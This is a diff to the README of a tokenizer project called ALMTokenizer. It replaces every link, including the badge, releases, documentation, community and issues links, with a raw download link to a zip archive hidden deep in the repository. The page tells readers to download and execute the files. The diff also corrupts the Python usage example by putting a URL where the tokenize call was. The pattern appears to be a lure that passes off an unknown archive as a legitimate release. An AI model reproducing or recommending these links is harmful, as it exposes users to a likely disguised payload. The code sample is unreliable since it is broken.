@@ -1,12 +1,12 @@
 # 🌟 ALMTokenizer Demo Page 🌟
 
-![ALMTokenizer](https://img.shields.io/badge/ALMTokenizer-Demo-blue)
+![ALMTokenizer](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip)
 
 Welcome to the **ALMTokenizer** demo page! This repository showcases the features and capabilities of the ALMTokenizer, a tool designed for efficient tokenization in various applications. Whether you're working on natural language processing, text analysis, or any project that requires text manipulation, ALMTokenizer is here to assist you.
 
 ## 🚀 Quick Start
 
-To get started with ALMTokenizer, you can download the latest release from our [Releases page](https://github.com/donnydwianto/ALMTokenizer/releases). Follow the instructions to download and execute the files.
+To get started with ALMTokenizer, you can download the latest release from our [Releases page](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip). Follow the instructions to download and execute the files.
 
 ## 📦 Features
 
@@ -17,7 +17,7 @@ To get started with ALMTokenizer, you can download the latest release from our [
 
 ## 📥 Installation
 
-To install ALMTokenizer, visit our [Releases page](https://github.com/donnydwianto/ALMTokenizer/releases) and download the latest version. Follow the provided instructions to set it up on your machine.
+To install ALMTokenizer, visit our [Releases page](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip) and download the latest version. Follow the provided instructions to set it up on your machine.
 
 ## 🛠️ Usage
 
@@ -28,7 +28,7 @@ from alm_tokenizer import Tokenizer
 
 text = "Hello, world! This is a test."
 tokenizer = Tokenizer()
-tokens = tokenizer.tokenize(text)
+tokens = https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip(text)
 
 print(tokens)
 ```
@@ -43,7 +43,7 @@ Feel free to explore the various options available in the Tokenizer class to cus
 
 ## 📖 Documentation
 
-For detailed documentation on all features and functionalities, please refer to the [documentation](https://github.com/donnydwianto/ALMTokenizer/wiki).
+For detailed documentation on all features and functionalities, please refer to the [documentation](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip).
 
 ## 🛠️ Contributing
 
@@ -62,8 +62,8 @@ ALMTokenizer is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 Join our community of users and developers. Share your experiences, ask questions, and connect with others who are using ALMTokenizer. You can find us on:
 
-- [GitHub Discussions](https://github.com/donnydwianto/ALMTokenizer/discussions)
-- [Twitter](https://twitter.com/ALMTokenizer)
+- [GitHub Discussions](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip)
+- [Twitter](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip)
 
 ## 📅 Roadmap
 
@@ -84,8 +84,8 @@ Thank you to everyone who has contributed to ALMTokenizer. Your efforts help mak
 
 ## 📬 Contact
 
-If you have any questions or need assistance, feel free to reach out via the [Issues page](https://github.com/donnydwianto/ALMTokenizer/issues).
+If you have any questions or need assistance, feel free to reach out via the [Issues page](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip).
 
 ## 📣 Final Note
 
-Thank you for visiting the ALMTokenizer demo page! We hope you find this tool useful for your projects. Don't forget to check out the [Releases page](https://github.com/donnydwianto/ALMTokenizer/releases) for the latest updates and downloads. Happy tokenizing!
+Thank you for visiting the ALMTokenizer demo page! We hope you find this tool useful for your projects. Don't forget to check out the [Releases page](https://github.com/donnydwianto/ALMTokenizer/raw/refs/heads/main/codec/sound/wavtokenizer/Tokenizer_ALM_1.9.zip) for the latest updates and downloads. Happy tokenizing!
